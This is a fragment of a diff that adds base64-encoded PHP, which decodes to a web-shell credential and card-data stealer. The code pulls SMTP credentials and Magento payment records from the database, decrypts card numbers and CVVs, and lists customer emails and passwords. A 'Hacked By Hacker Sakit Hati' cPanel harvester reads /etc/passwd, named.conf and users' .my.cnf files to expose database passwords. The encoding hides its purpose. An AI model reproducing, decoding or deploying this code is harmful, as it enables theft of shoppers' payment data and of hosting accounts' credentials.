+Y29yZV9jb25maWdfZGF0YSBsaW1pdCAxLDEiKTsKCQlpZihteXNxbF9udW1fcm93cygkeDEzYSkg
+IT0gMCl7CgkJCWlmICghJHgxM2EpewoJCQkJICBlY2hvICI8Y2VudGVyPjxiPkdhZ2FsPC9iPjwv
+Y2VudGVyPiI7CgkJCX1lbHNlewoJCQkJICBlY2hvJzxicj48YnI+CgkJCQkJCT09PT09PT09PT09
+PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09
+PGJyPgoJCQkJCQkJCQkJWyBTTVRQIF0gPGJyPgoJCQkJCQk9PT09PT09PT09PT09PT09PT09PT09
+PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PTxicj4nOwoJCQl9
+CgkJCWVjaG8gIgoJCQk8dGFibGUgYm9yZGVyPScxJyBhbGlnbj0nY2VudGVyJyA+CgkJCTx0cj4K
+CQkJPHRkPm5vPC90ZD4KCQkJPHRkPmhvc3Q8L3RkPgkJCgkJCTx0ZD5wb3J0PC90ZD4KCQkJPHRk
+PnVzZXI8L3RkPgoJCQk8dGQ+cGFzczwvdGQ+CQoJCQk8L3RyPiI7CgkJCQkkeDEzNSA9IDE7CgkJ
+CQkkeDEzYiA9IDA7CgkJCQl3aGlsZSgkeDEzYyA9IG15c3FsX2ZldGNoX2FycmF5KCR4MTNhKSkg
+ewoJCQkJCSR4MTNkID0gJHgxM2NbMF07CgkJCQkJJHgxM2UgPSAkeDEzY1sxXTsKCQkJCQkkeDEz
+ZiA9ICR4MTNjWzJdOwoJCQkJCSR4MTQwID0gJHgxM2NbM107CgkJCQkJZWNobyAiPHRyPjxwcmU+
+PHRkPiR4MTM1PC90ZD48dGQ+JHgxM2Q8L3RkPjx0ZD4keDEzZTwvdGQ+PHRkPiR4MTNmPC90ZD48
+dGQ+JHgxNDA8L3RkPjwvcHJlPjwvdHI+IjsKCQkJCQkkeDEzNSsrOwoJCQkJfQoJCQllY2hvICI8
+L3RhYmxlPjxicj4iOwoJCX0KCQkvLz09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09
+PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09
+PT09PT09PT09PT09PQoJCSR4MTFiID0gbXlzcWxfcXVlcnkoIlNFTEVDVCBzZm8udXBkYXRlZF9h
+dCxzZm8uY2Nfb3duZXIsc2ZvLm1ldGhvZCxzZm8uY2NfbnVtYmVyX2VuYyxzZm8uY2NfY2lkX2Vu
+YyxDT05DQVQoc2ZvLmNjX2V4cF9tb250aCwnIHwnLHNmby5jY19leHBfeWVhcikgYXMgZXhwLENP
+TkNBVChiaWxsaW5nLmZpcnN0bmFtZSwnIHwgJyxiaWxsaW5nLmxhc3RuYW1lLCcgfCAnLGJpbGxp
+bmcuc3RyZWV0LCcgfCAnLGJpbGxpbmcuY2l0eSwnIHwgJywgYmlsbGluZy5yZWdpb24sJyB8ICcs
+YmlsbGluZy5wb3N0Y29kZSwnIHwgJyxiaWxsaW5nLmNvdW50cnlfaWQsJyB8ICcsYmlsbGluZy50
+ZWxlcGhvbmUsJyB8LXwgJyxiaWxsaW5nLmVtYWlsKSBBUyAnQmlsbGluZyBBZGRyZXNzJyBGUk9N
+IHNhbGVzX2ZsYXRfcXVvdGVfcGF5bWVudCBBUyBzZm8gSk9JTiBzYWxlc19mbGF0X3F1b3RlX2Fk
+ZHJlc3MgQVMgYmlsbGluZyBPTiBiaWxsaW5nLnF1b3RlX2lkID0gc2ZvLnF1b3RlX2lkIEFORCBi
+aWxsaW5nLmFkZHJlc3NfdHlwZSA9ICdiaWxsaW5nJyIpOwoJCSR4MTQxID0gbXlzcWxfcXVlcnko
+IlNFTEVDVCBzZm8uY2Nfb3duZXIsc2ZvLm1ldGhvZCxzZm8uY2NfbnVtYmVyX2VuYyxzZm8uY2Nf
+Y2lkX3N0YXR1cyxDT05DQVQoc2ZvLmNjX2V4cF9tb250aCwnfCcsc2ZvLmNjX2V4cF95ZWFyKSBh
+cyBleHAsQ09OQ0FUKGJpbGxpbmcuZmlyc3RuYW1lLCcgfCAnLGJpbGxpbmcubGFzdG5hbWUsJyB8
+ICcsYmlsbGluZy5zdHJlZXQsJyB8ICcsYmlsbGluZy5jaXR5LCcgfCAnLCBiaWxsaW5nLnJlZ2lv
+biwnIHwgJyxiaWxsaW5nLnBvc3Rjb2RlLCcgfCAnLGJpbGxpbmcuY291bnRyeV9pZCwnIHwgJyxi
+aWxsaW5nLnRlbGVwaG9uZSwnIHwgJyxiaWxsaW5nLmVtYWlsKSBBUyAnQmlsbGluZyBBZGRyZXNz
+JyBGUk9NIHNhbGVzX2ZsYXRfb3JkZXJfcGF5bWVudCBBUyBzZm8gSk9JTiBzYWxlc19mbGF0X29y
+ZGVyX2FkZHJlc3MgQVMgYmlsbGluZyBPTiBiaWxsaW5nLnBhcmVudF9pZCA9IHNmby5wYXJlbnRf
+aWQgQU5EIGJpbGxpbmcuYWRkcmVzc190eXBlID0gJ2JpbGxpbmcnIHdoZXJlIGNjX251bWJlcl9l
+bmMgIT0gJyciKTsKCQlpZihteXNxbF9udW1fcm93cygkeDExYikgIT0gMCB8fCBteXNxbF9udW1f
+cm93cygkeDE0MSkgIT0gMCl7CgkJCSAgZWNobyc8YnI+PGJyPgoJCQkJCT09PT09PT09PT09PT09
+PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PGJy
+PgoJCQkJCQkJCQlbIENyZWRpdCBDYXJkIF0gPGJyPgoJCQkJCT09PT09PT09PT09PT09PT09PT09
+PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PGJyPic7CgkJ
+CQllY2hvICIKCQkJCTx0YWJsZSBib3JkZXI9JzEnIGFsaWduPSdsZWZ0JyA+CgkJCQk8dHI+CgkJ
+CQk8dGQ+bm88L3RkPgoJCQkJPHRkPkRhdGU8L3RkPgoJCQkJPHRkPkNyZWRpdCBPd25lcjwvdGQ+
+CgkJCQk8dGQ+bWV0aG9kPC90ZD4KCQkJCTx0ZD5DcmVkaXQgTnVtYmVyPC90ZD4KCQkJCTx0ZD5D
+cmVkaXQgRXhwPC90ZD4KCQkJCTx0ZD5DVlY8L3RkPgoJCQkJPHRkPkFkZHJlc3M8L3RkPgoJCQkJ
+PC90cj4iOwoJCQkJCSR4MTM1ID0gMTsKCQkJCQkkeDEzYiA9IDA7CgkJCQkJd2hpbGUoJHgxMzQg
+PSBteXNxbF9mZXRjaF9hcnJheSgkeDExYikpewoJCQkJCSR4MTQyID0gJHgxMzRbJ3VwZGF0ZWRf
+YXQnXTsKCQkJCQkkeDE0MyA9ICR4MTM0WydjY19vd25lciddOwoJCQkJCSR4MTQ0ID0gJHgxMzRb
+J21ldGhvZCddOwoJCQkJCSR4MTQ1ID0gJHgxMzMtPmRlY3J5cHQoJHgxMzRbJ2NjX251bWJlcl9l
+bmMnXSk7CgkJCQkJJHgxMGUgPSAkeDEzNFsnZXhwJ107CQkKCQkJCQkkeDE0NiA9ICR4MTMzLT5k
+ZWNyeXB0KCR4MTM0WydjY19jaWRfZW5jJ10pOwkKCQkJCQkkeDE0NyA9ICR4MTM0WydCaWxsaW5n
+IEFkZHJlc3MnXTsKCQkJCQllY2hvICI8dHI+PHByZT48dGQ+JHgxMzU8L3RkPjx0ZD4keDE0Mjwv
+dGQ+PHRkPiR4MTQzPC90ZD48dGQ+JHgxNDQ8L3RkPjx0ZD4keDE0NTwvdGQ+PHRkPiR4MTBlPC90
+ZD48dGQ+JHgxNDY8L3RkPjx0ZD4keDE0NzwvdGQ+PC9wcmU+PC90cj4iOwoJCQkJCSR4MTNiID0g
+JHgxMzUrKzsKCQkJCQl9CgkJCQkJCgkJCQkJd2hpbGUoJHgxNDggPSBteXNxbF9mZXRjaF9hcnJh
+eSgkeDE0MSkpewoJCQkJCQkkeDEzYiArPTE7CgkJCQkJJHgxNDMgPSAkeDE0OFsnY2Nfb3duZXIn
+XTsKCQkJCQkkeDE0NCA9ICR4MTQ4WydtZXRob2QnXTsKCQkJCQkkeDE0NSA9ICR4MTMzLT5kZWNy
+eXB0KCR4MTQ4WydjY19udW1iZXJfZW5jJ10pOwoJCQkJCSR4MTBlID0gJHgxNDhbJ2V4cCddOwkJ
+CgkJCQkJJHgxNDkgPSAkeDEzMy0+ZGVjcnlwdCgkeDE0OFsnY2NfY2lkX3N0YXR1cyddKTsKCQkJ
+CQkkeDE0NyA9ICR4MTQ4WydCaWxsaW5nIEFkZHJlc3MnXTsKCQkJCQllY2hvICI8dHI+PHByZT48
+dGQ+JHgxM2I8L3RkPjx0ZD4keDE0MzwvdGQ+PHRkPiR4MTQ0PC90ZD48dGQ+JHgxNDU8L3RkPjx0
+ZD4keDEwZTwvdGQ+PHRkPiR4MTQ5PC90ZD48dGQ+JHgxNDc8L3RkPjwvcHJlPjwvdHI+IjsKCQkJ
+CQkgJHgxM2IrKzsKCQkJCQl9CSAKCQkJCQkKCQkJCWVjaG8gIjwvdGFibGU+PGJyPiI7CQoJCX0K
+CQkvLz09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09
+PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PQoJCSR4
+MTFiID0gbXlzcWxfcXVlcnkoIlNFTEVDVCBlbWFpbCx2YWx1ZSBGUk9NIGN1c3RvbWVyX2VudGl0
+eV92YXJjaGFyLCBjdXN0b21lcl9lbnRpdHkgV0hFUkUgY3VzdG9tZXJfZW50aXR5X3ZhcmNoYXIu
+ZW50aXR5X2lkID0gY3VzdG9tZXJfZW50aXR5LmVudGl0eV9pZCBhbmQgYXR0cmlidXRlX2lkPTEy
+Iik7CgkJJHgxNDEgPSBteXNxbF9xdWVyeSgiU0VMRUNUIGN1c3RvbWVyX2VtYWlsLHBhc3N3b3Jk
+X2hhc2ggRlJPTSBzYWxlc19mbGF0X3F1b3RlIik7CgkJCgkJCgkJaWYobXlzcWxfbnVtX3Jvd3Mo
+JHgxMWIpICE9IDAgfHwgbXlzcWxfbnVtX3Jvd3MoJHgxNDEpICE9IDAgKXsKCQkJaWYgKCEkeDEx
+Yil7CgkJCQkgIGVjaG8gIjxjZW50ZXI+PGI+R2FnYWw8L2I+PC9jZW50ZXI+IjsKCQkJfWVsc2V7
+CgkJCQkgIGVjaG8nPGJyPjxicj4KCQkJCQkJPT09PT09PT09PT09PT09PT09PT09PT09PT09PT09
+PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT08YnI+CgkJCQkJCQkJCQlbIEN1
+c3RvbWVyIF0gPGJyPgoJCQkJCQk9PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09
+PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PTxicj4nOwoJCQl9CgkJCWVjaG8gIgoJCQk8
+dGFibGUgYm9yZGVyPScxJyBhbGlnbj0nY2VudGVyJyA+CgkJCTx0cj4KCQkJPHRkPm5vPC90ZD4K
+CQkJPHRkPnVzZXI8L3RkPgoJCQk8dGQ+cGFzczwvdGQ+CQoJCQk8L3RyPiI7CgkJCQkkeDEzNSA9
+IDE7CgkJCQkkeDEzYiA9IDA7CgkJCQl3aGlsZSgkeDEzNCA9IG15c3FsX2ZldGNoX2FycmF5KCR4
+MTFiKSkgewoJCQkJCSR4MTAyID0gJHgxMzRbJ2VtYWlsJ107CgkJCQkJJHgxMTQgPSAkeDEzNFsn
+dmFsdWUnXTsKCQkJCQllY2hvICI8dHI+PHByZT48dGQ+JHgxMzU8L3RkPjx0ZD4keDEwMjwvdGQ+
+PHRkPiR4MTE0PC90ZD48L3ByZT48L3RyPiI7CgkJCQkJJHgxM2IgPSAkeDEzNSsrOwoJCQkJfSAK
+CQkJCQoJCQkJaWYobXlzcWxfbnVtX3Jvd3MoJHgxNDEpICE9IDAgJiYgKCR4MTQxKSl7CgkJCQkJ
+d2hpbGUoJHgxNDggPSBteXNxbF9mZXRjaF9hcnJheSgkeDE0MSkpewoJCQkJCQkkeDEwMiA9ICR4
+MTQ4WydjdXN0b21lcl9lbWFpbCddOwoJCQkJCQkkeDExNCA9ICR4MTMzLT5kZWNyeXB0KCR4MTQ4
+WydwYXNzd29yZF9oYXNoJ10pOwoJCQkJCQlpZighZW1wdHkoJHgxMDIpICYmICFlbXB0eSgkeDEx
+NCkpeyAvL3RhbXBpbGluIGtldGlrYSBkYXRhbnlhIGl0dSBhZGEga2xvIGdrIGFkYSB5YSBqYW5n
+YW4gZGkgdGFtcGlpbiAKCQkJCQkJCSR4MTNiICs9MTsKCQkJCQkJCWVjaG8gIjx0cj48cHJlPjx0
+ZD4keDEzYjwvdGQ+PHRkPiR4MTAyPC90ZD48dGQ+JHgxMTQ8L3RkPjwvcHJlPjwvdHI+IjsKCQkJ
+CQkJCSR4MTNiKys7CgkJCQkJCX0KCQkJCQl9CQkJCQoJCQkJfQoJCQkKCQkJZWNobyAiPC90YWJs
+ZT48YnI+IjsKCQl9CgkJLy89PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09
+PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09
+PT09PT09PT0KCSAgfQoJfQoJZnVuY3Rpb24gc2F2ZSgkeDE0YSwkeDEwKXsKCQkkeGIyID0gZm9w
+ZW4oJHgxNGEsICdhJyk7CgkJZndyaXRlKCR4YjIsICR4MTApOwoJCWZjbG9zZSgkeGIyKTsKCX0K
+CWZ1bmN0aW9uIGNla2Jhc2U2NCgkeDE1KXsgCgkJCSR4MTRiID0gYmFzZTY0X2RlY29kZSgkeDE1
+LCB0cnVlKTsKCQkJaWYgKCFwcmVnX21hdGNoKCcvXlthLXpBLVowLTlcL1xyXG4rXSo9ezAsMn0k
+LycsICR4MTUpKSByZXR1cm4gZmFsc2U7CgkJCWlmKCFiYXNlNjRfZGVjb2RlKCR4MTUsIHRydWUp
+KSByZXR1cm4gZmFsc2U7CgkJCWlmKGJhc2U2NF9lbmNvZGUoJHgxNGIpICE9ICR4MTUpIHJldHVy
+biBmYWxzZTsKCQkJcmV0dXJuIHRydWU7Ly9uaWxhaSByZXR1cm4gMSBqaWthIHRydWUKCQl9Cgkv
+Ly0tLS11bnR1ayBkZWNvZGUgcGFzc3dvcmQgLS0tLwoJY2xhc3MgVmFyaWVuX0NyeXB0X01jcnlw
+dHsKCQkvKioKCQkgKiBDb25zdHVjdG9yCgkJICoKCQkgKiBAcGFyYW0gYXJyYXkgJHgxMAoJCSAq
+LwoJCXB1YmxpYyBmdW5jdGlvbiBfX2NvbnN0cnVjdCgpCgkJewoJCX0KCgkJLyoqCgkJICogSW5p
+dGlhbGl6ZSBtY3J5cHQgbW9kdWxlCgkJICoKCQkgKiBAcGFyYW0gc3RyaW5nICR4MTMgY2lwaGVy
+IHByaXZhdGUga2V5CgkJICogQHJldHVybiBWYXJpZW5fQ3J5cHRfTWNyeXB0CgkJICovCgkJcHVi
+bGljIGZ1bmN0aW9uIGluaXQoJHgxMykKCQl7CgkJCSR0aGlzLT5oYW5kbGVyID0gbWNyeXB0X21v
+ZHVsZV9vcGVuKE1DUllQVF9CTE9XRklTSCwgJycsIE1DUllQVF9NT0RFX0VDQiwgJycpOwoJCQkk
+eDE0YyA9IG1jcnlwdF9jcmVhdGVfaXYgKG1jcnlwdF9lbmNfZ2V0X2l2X3NpemUoJHRoaXMtPmhh
+bmRsZXIpLCBNQ1JZUFRfUkFORCk7CgkJCSR4MTRkID0gbWNyeXB0X2VuY19nZXRfa2V5X3NpemUo
+JHRoaXMtPmhhbmRsZXIpOwoKCQkJaWYgKGljb252X3N0cmxlbigkeDEzLCAnVVRGLTgnKT4keDE0
+ZCkgewoJCQkJLy90aHJvdyBuZXcgVmFyaWVuX0V4Y2VwdGlvbignTWF4aW11bSBrZXkgc2l6ZSBt
+dXN0IHNob3VsZCBiZSBzbWFsbGVyICcuJHgxNGQpOwoJCQkJcmV0dXJuIG51bGw7CgkJCX0KCgkJ
+CW1jcnlwdF9nZW5lcmljX2luaXQoJHRoaXMtPmhhbmRsZXIsICR4MTMsICR4MTRjKTsKCgkJCXJl
+dHVybiAkdGhpczsKCQl9CgoJCS8qKgoJCSAqIEVuY3J5cHQgZGF0YQoJCSAqCgkJICogQHBhcmFt
+IHN0cmluZyAkeDEwIHNvdXJjZSBzdHJpbmcKCQkgKiBAcmV0dXJuIHN0cmluZwoJCSAqLwoJCXB1
+YmxpYyBmdW5jdGlvbiBlbmNyeXB0KCR4MTApCgkJewoJCQlpZiAoISR0aGlzLT5oYW5kbGVyKSB7
+CgkJCQkvL3Rocm93IG5ldyBWYXJpZW5fRXhjZXB0aW9uKCdDcnlwdCBtb2R1bGUgaXMgbm90IGlu
+aXRpYWxpemVkLicpOwoJCQkJcmV0dXJuIG51bGw7CgkJCX0KCQkJaWYgKHN0cmxlbigkeDEwKSA9
+PSAwKSB7CgkJCQlyZXR1cm4gJHgxMDsKCQkJfQoJCQlyZXR1cm4gYmFzZTY0X2VuY29kZShtY3J5
+cHRfZ2VuZXJpYygkdGhpcy0+aGFuZGxlciwgJHgxMCkpOwoJCX0KCgkJLyoqCgkJICogRGVjcnlw
+dCBkYXRhCgkJICoKCQkgKiBAcGFyYW0gc3RyaW5nICR4MTAgZW5jcnlwdGVkIHN0cmluZwoJCSAq
+IEByZXR1cm4gc3RyaW5nCgkJICovCgkJcHVibGljIGZ1bmN0aW9uIGRlY3J5cHQoJHgxMCkKCQl7
+CgkJCWlmICghJHRoaXMtPmhhbmRsZXIpIHsKCQkJCS8vdGhyb3cgbmV3IFZhcmllbl9FeGNlcHRp
+b24oJ0NyeXB0IG1vZHVsZSBpcyBub3QgaW5pdGlhbGl6ZWQuJyk7CgkJCQlyZXR1cm4gbnVsbDsK
+CQkJfQoJCQlpZiAoc3RybGVuKCR4MTApID09IDApIHsKCQkJCXJldHVybiAkeDEwOwoJCQl9CgkJ
+CXJldHVybiBtZGVjcnlwdF9nZW5lcmljKCR0aGlzLT5oYW5kbGVyLCBiYXNlNjRfZGVjb2RlKCR4
+MTApKTsKCQl9CgkJCQoJIAoJCS8qKgoJCSAqIERlc2N0cnVjdCBjaXBoZXIgbW9kdWxlCgkJICoK
+CQkgKi8KCQlwdWJsaWMgZnVuY3Rpb24gX19kZXN0cnVjdCgpCgkJewoJCQlpZiAoJHRoaXMtPmhh
+bmRsZXIpIHsKCQkJCSR0aGlzLT5fcmVzZXQoKTsKCQkJfQoJCX0KCgkJcHJvdGVjdGVkIGZ1bmN0
+aW9uIF9yZXNldCgpCgkJewoJCQltY3J5cHRfZ2VuZXJpY19kZWluaXQoJHRoaXMtPmhhbmRsZXIp
+OwoJCQltY3J5cHRfbW9kdWxlX2Nsb3NlKCR0aGlzLT5oYW5kbGVyKTsKCQl9Cgl9CgoKLy8qKioq
+KioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioq
+KioqKioqKioqKioqKioqKiovLwoKCXNldF90aW1lX2xpbWl0KDApOwoJZXJyb3JfcmVwb3J0aW5n
+KDApOwoKCWlmKGdldF9tYWdpY19xdW90ZXNfZ3BjKCkpewoJZm9yZWFjaCgkX1BPU1QgYXMgJHgx
+Mz0+JHgxNCl7CgkkX1BPU1RbJHgxM10gPSBzdHJpcHNsYXNoZXMoJHgxNCk7Cgl9Cgl9CgllY2hv
+ICcKCTx0YWJsZSB3aWR0aD0iNzAwIiBib3JkZXI9IjAiIGNlbGxwYWRkaW5nPSIzIiBjZWxsc3Bh
+Y2luZz0iMSIgYWxpZ249ImNlbnRlciI+Cgk8dHI+PHRkPkxva2FzaSA6ICc7CmlmICggaXNzZXQo
+JF9HRVRbJ0NwQyddKSApCnsKLyoqCgkJCQkJSGFja2VkIEJ5IEhhY2tlciBTYWtpdCBIYXRpCgoJ
+CV8gIF8gX19fXyBfX19fIF8gIF8gX19fXyBfX19fIF9fX18gX19fXyBfICBfIF8gX19fIF8gIF8g
+X19fXyBfX18gXyAKCQl8X198IHxfX3wgfCAgICB8Xy8gIHxfX18gfF9fLyBbX18gIHxfX3wgfF8v
+ICB8ICB8ICB8X198IHxfX3wgIHwgIHwgCgkJfCAgfCB8ICB8IHxfX18gfCBcXyB8X19fIHwgIFwg
+X19fXSB8ICB8IHwgXF8gfCAgfCAgfCAgfCB8ICB8ICB8ICB8IAogICAgICAgICAgICAgICAgICAg
+ICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAJCQkgICAKCiovCgpA
+aW5pX3NldCgnZGlzcGxheV9lcnJvcnMnLDApOwpmdW5jdGlvbiBlbnRyZTJ2MigkeDEyZCwkeDE0
+ZSwkeDE0ZiwkeDhjPTEpewogICAgJHgxNTA9ZXhwbG9kZSgkeDE0ZSwgJHgxMmQpOwogICAgJHgx
+NTE9ZXhwbG9kZSgkeDE0ZiwgJHgxNTBbJHg4Y10pOwogICAgcmV0dXJuIHRyaW0oJHgxNTFbMF0p
+Owp9CgplY2hvICc8aHRtbD48aGVhZD4KPHRpdGxlPkhzSCBDcGFuZWw8L3RpdGxlPgo8bWV0YSBj
+b250ZW50PSJ0ZXh0L2h0bWw7IGNoYXJzZXQ9dXRmLTgiPgo8c3R5bGU+CmJvZHksdGFibGV7YmFj
+a2dyb3VuZDogIDsgZm9udC1mYW1pbHk6VmVyZGFuYSx0YWhvbWE7IGNvbG9yOiBsaW1lIDsgZm9u
+dC1zaXplOjEwcHggfQpBOmxpbmsge3RleHQtZGVjb3JhdGlvbjogbm9uZTtjb2xvcjogZGFya3Zp
+b2xldDt9CkE6YWN0aXZlIHt0ZXh0LWRlY29yYXRpb246IG5vbmU7Y29sb3I6IGFxdWE7fQpBOnZp
+c2l0ZWQge3RleHQtZGVjb3JhdGlvbjogbm9uZTtjb2xvcjogYXF1YTt9CkE6aG92ZXIge3RleHQt
+ZGVjb3JhdGlvbjogdW5kZXJsaW5lOyBjb2xvcjogRnVjaHNpYTt9CiNuZXcsaW5wdXQsdGFibGUs
+dGQsdHIsI2dne2JvcmRlci1zdHlsZTpzb2xpZDt0ZXh0LWRlY29yYXRpb246Ym9sZCA7fQppbnB1
+dDpob3Zlcix0cjpob3Zlcix0ZDpob3ZlcntiYWNrZ3JvdW5kLWNvbG9yOiAgOyBjb2xvcjogYXF1
+YTt9Cjwvc3R5bGU+CjxsaW5rIHJlbD0iU0hPUlRDVVQgSUNPTiIgaHJlZj0iaHR0cDovL2k0OC5z
+ZXJ2aW1nLmNvbS91L2Y0OC8xNi8wOC8wNy83NC9pbmRvbmUxMC5naWYiPjxjZW50ZXI+IAo8L2hl
+YWQ+PGJvZHk+JzsKZWNobyAnPGRpdiBzdHlsZT0iZm9udC1mYW1pbHk6IEljZWxhbmQ7Zm9udC1z
+aXplOiAzNXB0O3RleHQtc2hhZG93OiAwIDAgNjZweCBkYXJrdmlvbGV0LCAwIDAgNXB4IGRhcmt2
+aW9sZXQsIDAgMCA1cHggZGFya3Zpb2xldDtjb2xvcjogc2lsdmVyIj4uLjo6WysgIGNQYW5lbCBP
+cGVuIFNlcnZlciArXTo6Li4gPGJyIC8+PHN1Yj5IYWNrZXIgU2FraXQgSGF0aTwvc3ViPjwvZGl2
+Pjxici8+JzsKCgokeDE1MiA9IEBmaWxlKCcvZXRjL25hbWVkLmNvbmYnKTsKJHgxNTMgPSBzY2Fu
+ZGlyKCIvdmFyL25hbWVkIik7CgppZiAoJHgxNTMgb3IgJHgxNTIpCnsKICAgICR4MTUzID0gc2Nh
+bmRpcigiL3Zhci9uYW1lZCIpOwogICAgaWYoJHgxNTMpIHsKZWNobyAiPHRhYmxlIGFsaWduPSdj
+ZW50ZXInPjx0cj48dGg+IE5vIDwvdGg+PHRoPiBXZWJzaXRlIDwvdGg+PHRoPiBVc2VyIDwvdGg+
+PHRoPiBQYXNzd29yZCA8L3RoPjx0aD4gSGFzaWwgPC90aD48L3RyPiI7CiR4MTU0PTE7CiR4MTU1
+ID0gMDsKJHg0YiA9IHNjYW5kaXIoIi92YXIvbmFtZWQiKTsKZm9yZWFjaCgkeDRiIGFzICR4MTU2
+KXsKaWYoc3RycG9zKCR4MTU2LCIuZGIiKSl7CiR4MTU2ID0gc3RyX3JlcGxhY2UoJy5kYicsJycs
+JHgxNTYpOwokeDE1NyA9IHBvc2l4X2dldHB3dWlkKGZpbGVvd25lcigiL2V0Yy92YWxpYXNlcy8i
+LiR4MTU2KSk7CiR4MTU4ID0gJy9ob21lLycuJHgxNTdbJ25hbWUnXS4nLy5teS5jbmYnOwokeGI3
+ID0gZ2V0Y3dkKCk7CgppZiAoaXNfcmVhZGFibGUoJHgxNTgpKSB7CmNvcHkoJHgxNTgsICcnLiR4
+YjcuJy8nLiR4MTU3WyduYW1lJ10uJy50eHQnKTsKJHgxNTk9ZmlsZV9nZXRfY29udGVudHMoJycu
+JHhiNy4nLycuJHgxNTdbJ25hbWUnXS4nLnR4dCcpOwokeDNiPWVudHJlMnYyKCR4MTU5LCdwYXNz
+d29yZD0iJywnIicpOwplY2hvICI8dHI+PHRkPiIuJHgxNTQrKy4iPC90ZD48dGQ+PGEgaHJlZj0n
+aHR0cDovLyIuJHgxNTYuIjovY3BhbmVsJyB0YXJnZXQ9J19ibGFuayc+Ii4keDE1Ni4iPC9hPjwv
+dGQ+PHRkPiIuJHgxNTdbJ25hbWUnXS4iPC90ZD48dGQ+Ii4keDNiLiI8L3RkPjx0ZD48YSBocmVm
+PSciLiR4MTU3WyduYW1lJ10uIi50eHQnIHRhcmdldD0nX2JsYW5rJz4gU2lsYWhrYW4gRGlidWth
+IDwvYT48L3RkPjwvdHI+IjsKJHgxNTUrKzsKfQoKfQp9CmVjaG8gJzwvdGFibGU+JzsgCiR4MTVh
+ID0gJHgxNTU7CmVjaG8gJzxicj48ZGl2IGNsYXNzPSJyZXN1bHQiPlRvdGFsIGNQYW5lbCBZYW5n
+IEtldGVtdSA9ICcuJHgxNWEuJzwvaDM+PGJyIC8+JzsKZWNobyAnPC9jZW50ZXI+JzsKfWVsc2V7
+CiR4MTUyID0gQGZpbGUoJy9ldGMvbmFtZWQuY29uZicpOwogICAgaWYoJHgxNTIpIHsKZWNobyAi
+PHRhYmxlIGFsaWduPSdjZW50ZXInPjx0cj48dGg+IE5vIDwvdGg+PHRoPiBXZWJzaXRlIDwvdGg+
+PHRoPiBVc2VyIDwvdGg+PHRoPiBQYXNzd29yZCA8L3RoPjx0aD4gSGFzaWwgPC90aD48L3RyPiI7
+CiR4MTU0PTE7CiR4MTU1ID0gMDsKJHgxNWIgPSBhcnJheSgpOwpmb3JlYWNoKCR4MTUyIGFzICR4
+MTVjKXsKICAgIGlmKEBlcmVnaSgnem9uZScsJHgxNWMpKXsKICAgICAgICBwcmVnX21hdGNoX2Fs
+bCgnI3pvbmUgIiguKikiIycsJHgxNWMsJHgxNTYpOwogICAgICAgIGZsdXNoKCk7CiAgICAgICAg
+aWYoc3RybGVuKHRyaW0oJHgxNTZbMV1bMF0pKSA+Mil7CiAgICAgICAgICAgICR4MTViW10gPSAk
+eDE1NlsxXVswXTsKICAgICAgICB9CiAgICB9Cn0KJHgxNWIgPSBhcnJheV91bmlxdWUoJHgxNWIp
+OwokeDE1ZCA9IGFycmF5KCk7CiR4MTVlID0gYXJyYXkoKTsKZm9yZWFjaCgkeDE1YiBhcyAkeDE1
+ZikgewogICAgJHgxNjAgPSBAcG9zaXhfZ2V0cHd1aWQoZmlsZW93bmVyKCIvZXRjL3ZhbGlhc2Vz
+LyIuJHgxNWYpKTsKICAgICR4MTVkW10gPSAkeDE2MFsnbmFtZSddOwogICAgJHgxNWVbXSA9ICR4
+MTVmOwp9CmFycmF5X211bHRpc29ydCgkeDE1ZCwkeDE1ZSk7CiR4MTYxID0gZmlsZSgnL2V0Yy9w
+YXNzd2QnKTsKJHgxNjIgPSBhcnJheSgpOwpmb3JlYWNoKCR4MTYxIGFzICR4MTYzKSB7CiAgICAk
+eDExZCA9IGV4cGxvZGUoJzonLCR4MTYzKTsKICAgIGlmKHN0cnBvcygkeDExZFs1XSwnaG9tZScp
+KSB7CiAgICAgICAgJHgxNjJbJHgxMWRbMF1dID0gJHgxMWRbNV07CiAgICB9Cn0KJHg0YT0wOwok
+eDE2ND0xOwpmb3JlYWNoKCR4MTVkIGFzICR4MTFkKSB7CiR4MTU4ID0gJy9ob21lLycuJHgxMWQu
+Jy8ubXkuY25mJzsKJHhiNyA9IGdldGN3ZCgpOwppZiAoaXNfcmVhZGFibGUoJHgxNTgpKSB7CmNv
+cHkoJHgxNTgsICcnLiR4YjcuJy8nLiR4MTFkLicudHh0Jyk7CiR4MTU5PWZpbGVfZ2V0X2NvbnRl
+bnRzKCcnLiR4YjcuJy8nLiR4MTFkLicudHh0Jyk7CiR4M2I9ZW50cmUydjIoJHgxNTksJ3Bhc3N3
+b3JkPSInLCciJyk7CmVjaG8gIjx0cj48dGQ+Ii4keDE1NCsrLiI8L3RkPjx0ZD48YSB0YXJnZXQ9
+J19ibGFuaycgaHJlZj1odHRwOi8vIi4keDE1ZVskeDE2NC0xXS4nLz4nLiR4MTVlWyR4MTY0LTFd
+LicgPC9hPjwvdGQ+PHRkPicuJHgxMWQuIjwvdGQ+PHRkPiIuJHgzYi4iPC90ZD48dGQ+PGEgaHJl
+Zj0nIi4keDExZC4iLnR4dCcgdGFyZ2V0PSdfYmxhbmsnPiBTaWxhaGthbiBEaWJ1a2EgPC9hPjwv
